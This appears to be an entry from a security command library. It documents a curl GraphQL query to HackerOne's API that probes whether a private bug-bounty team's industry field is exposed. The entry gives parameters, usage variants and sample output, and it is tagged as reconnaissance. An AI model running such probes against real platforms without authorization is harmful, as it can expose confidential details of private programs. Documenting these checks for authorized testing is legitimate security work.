---
id: 123e4567-e89b-12d3-a456-426614174002
name: graphql-query-team-industry-private1
type: command
executor: bash
data: >-
  curl -X POST https://api.hackerone.com/graphql -H "Content-Type:
  application/json" -d '{"query": "query
  {team(handle:\"example-private-team1\"){_id,industry}}"}'
output: >-
  {"data":{"team":{"_id":"example-id","industry":"Computer Hardware &
  Peripherals"}}}
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:59.955Z'
platforms:
  - Web
tags:
  - graphql
  - api
  - reconnaissance
verified: false
validated: true
submitted: true
---

# graphql-query-team-industry-private1

## Command

```bash
curl -X POST https://api.hackerone.com/graphql -H "Content-Type: application/json" -d '{"query": "query {team(handle:\"example-private-team1\"){_id,industry}}"}'
```

## Description

This command sends a GraphQL POST request to HackerOne's API to query the team object for a private program handle, disclosing the 'industry' field if associated with private bug bounties. Use it to test information disclosure on known private teams.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `https://api.hackerone.com/graphql` | GraphQL endpoint URL | Yes |
| `-H "Content-Type: application/json"` | Sets JSON header | Yes |
| `-d '{...}'` | GraphQL query payload with handle | Yes |
| `handle: \"example-private-team1\"` | Team handle for private program | Yes (replace with actual) |

## Examples

### Basic Usage

```bash
curl -X POST https://api.hackerone.com/graphql -H "Content-Type: application/json" -d '{"query": "query {team(handle:\"example-private-team1\"){_id,industry}}"}'
```

### Advanced Usage

Add silent mode and output to file:

```bash
curl -s -X POST https://api.hackerone.com/graphql -H "Content-Type: application/json" -d '{"query": "query {team(handle:\"example-private-team1\"){_id,industry}}"}' > response.json
```

## Expected Output

JSON response showing non-null industry for private teams: {"data":{"team":{"_id":"example-id","industry":"Computer Hardware & Peripherals"}}}.

## Related

- [[commands/graphql-query-team-industry-private2]]
- [[procedures/Query-HackerOne-GraphQL-Team-Industry]]
